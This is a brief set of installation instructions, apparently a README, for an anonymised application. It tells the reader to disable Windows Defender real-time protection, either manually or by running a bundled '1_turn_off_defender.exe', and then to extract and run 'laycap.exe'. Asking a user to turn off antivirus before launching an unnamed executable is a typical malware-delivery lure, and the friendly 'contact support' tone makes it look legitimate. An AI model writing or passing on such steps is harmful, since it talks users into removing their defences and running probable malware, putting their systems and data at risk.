# Instructions for Installing xxxxxx Application

Follow these steps to install and run the xxxxxx application:

1. **Extracting the xxxxxx.zip folder:**
   - Locate the `xxxxxx.zip` folder in your file directory.
   - Right-click on the `xxxxxx.zip` folder.
   - Select "Extract" or "Extract Here" from the context menu.
   - Wait for the extraction process to complete.

2. **go to the xxxxxx folder:**
   - Open the extracted folder named `xxxxxx`.

NOTE >>> For disabling Windows Defender, you have two options:

- Follow the steps provided below.
- Manually disable it by navigating to 'Settings > Update & Security > Windows Security > Virus & threat protection > Manage settings > Real-time protection'.



3. **Disabling Windows Defender:**
   - Within the `xxxxxx` folder, locate the file named `1_turn_off_defender.exe`.
   - Double-click on `1_turn_off_defender.exe` to run it.
   - Wait for the process to complete. This may take a few moments.
   - After the process click "Yes".

4. **Extracting and running laycap.zip:**
   - After Windows Defender has been turned off, locate the file `2_laycap.zip` within the `xxxxxx` folder.
   - Right-click on `2_laycap.zip`.
   - Select "Extract" or "Extract Here" from the context menu.
   - Once the extraction is complete, locate the extracted files.
   - Double-click on `laycap.exe` to run it.

Following these steps should help you install and run the xxxxxx application smoothly. If you encounter any issues, feel free to contact support.
